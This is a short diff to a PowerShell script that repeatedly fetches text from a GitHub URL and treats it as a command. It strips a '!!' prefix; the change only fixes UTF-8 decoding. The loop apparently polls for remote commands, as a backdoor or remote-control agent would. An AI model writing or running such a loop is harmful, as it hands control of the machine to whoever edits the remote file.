@@ -7,8 +7,8 @@ while ($true) {
         # Force a new request and clear the cache by using Invoke-WebRequest
         $response = Invoke-WebRequest -Uri $githubUrl
 
-        # Fetch the content from the response
-        $command = $response.Content
+        # Convert the content to a string explicitly (in case it's byte data)
+        $command = [System.Text.Encoding]::UTF8.GetString($response.Content)
 
         # Check if the command starts with '!!' and strip that part off
         if ($command -like "!!*") {
